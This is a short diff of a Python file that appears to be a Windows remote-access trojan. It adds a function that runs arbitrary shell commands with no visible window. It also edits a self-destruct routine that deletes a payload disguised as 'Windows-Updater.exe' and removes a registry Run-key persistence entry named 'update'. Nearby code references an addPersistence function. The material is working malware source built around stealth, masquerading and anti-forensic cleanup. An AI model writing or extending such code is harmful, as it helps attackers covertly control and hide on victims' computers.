@@ -16,7 +16,6 @@ def addPersistence():
     except Exception as e:
         return f"error: {e}"
 
-
 def getUsername():
     try:
         USERNAME = os.getlogin()
@@ -24,15 +23,21 @@ def getUsername():
         USERNAME = "None"
     return USERNAME
 
+def cmd(command):
+    result = sp.Popen(command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True,
+                        text=True, creationflags=0x08000000)
+    out, err = result.communicate()
+    result.wait()
+    if not err:
+        return out
+    else:
+        return err
 
 def selfdestruct():
     try:
         update_location = os.environ["appdata"] + "\\Windows-Updater.exe"
-        config_location = fr'C:\Users\{getUsername()}\.config'
         if os.path.exists(update_location):
             os.remove(update_location)
-        if os.path.exists(config_location):
-            shutil.rmtree(config_location)
         sp.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f', shell=True)
         return True
 
